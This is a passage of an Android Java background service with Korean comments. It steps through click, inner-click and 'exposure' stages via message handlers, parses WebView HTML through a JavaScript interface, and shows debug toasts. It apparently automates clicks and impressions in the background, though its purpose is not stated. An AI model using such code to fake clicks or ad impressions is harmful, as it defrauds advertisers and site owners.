                ShowMsgToast("[노출 Exception]\n" + m_MainInfo.D + "호출하던중 오류가 발생하였습니다.\n" + ex.getMessage());
                MoveStep(STEP.STEP_MAIN);
            }
        }

        //		/** 내부클릭관련 페이지 응답결과를 파싱한다.**/
        @JavascriptInterface
        public void procInClick(String html) {
            m_WebViewHandler.removeMessages(0);
            parseSubLinkTag(html);
        }
    }

    //	/** 상태 전이 함수 **/
    public void MoveStep(STEP step) {

        Log.i("test1", "고만불러라"+GetURL(m_CLICKURL));
        mMainHandler.removeMessages(0);
        mClickHandler.removeMessages(0);
        mClickURLHandler.removeMessages(0);
        mSubClickURLHandler.removeMessages(0);
        mShowHandler.removeMessages(0);
        mShowURLHandler.removeMessages(0);
        m_IFrameHandler.removeMessages(0);
        m_WebViewHandler.removeMessages(0);
        switch (step) {
            case STEP_MAIN:
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                    Log.i("test2", "서버호출1");
                    Handler handler = new Handler();
                    handler.postDelayed(new Runnable() {
                        @Override
                        public void run() {
                            stopSelf();
                        }
                    },3000);

                } else {
                    Log.i("test2", "서버호출11");
                }

                break;
            case STEP_CLICKURL:
                mClickHandler.sendEmptyMessage(0);
                Log.i("test2", "서버호출2");
                break;
            case STEP_CLICK:
                mClickURLHandler.sendEmptyMessage(0);
                Log.i("test2", "서버호출3");
                break;
            case STEP_INCLICK:
                mSubClickURLHandler.sendEmptyMessage(0);
                Log.i("test2", "서버호출4");
                break;
            case STEP_SHOWURL:
                mShowHandler.sendEmptyMessage(0);
                Log.i("test2", "서버호출5");
                break;
            case STEP_SHOW:
                mShowURLHandler.sendEmptyMessage(0);
                Log.i("test2", "서버호출6");
                break;
            default:
                break;
        }
    }

    //	/** 로그(Toast)를 보여주기 위한 함수 **/
    public void ShowMsgToast(String message) {
        if (!g_ShowLog)
            return;

        if (m_MainContext == null) {
            m_MainContext = getApplicationContext();
        }
        m_strLog = message;
        Log.i("-------", m_strLog);
        Toast.makeText(m_MainContext, message, Toast.LENGTH_SHORT).show();
    }

    private String m_strLog;
    private String m_strPreLog = "";
    private Handler m_LogHandler = new Handler() {
        @Override
        public void handleMessage(Message msg) {
            if (!g_ShowLog)
                return;

            if (m_MainContext == null) {
                m_MainContext = getApplicationContext();
            }
            if (!m_strPreLog.equals(m_strLog)) {
                Toast.makeText(m_MainContext, m_strLog, Toast.LENGTH_SHORT).show();
            } else {
                Toast.makeText(m_MainContext, "[Toast]\n" + m_strLog, Toast.LENGTH_SHORT).show();
            }
            m_strPreLog = m_strLog;
            m_LogHandler.sendEmptyMessageDelayed(0, 2 * 1000);
        }
    };

}
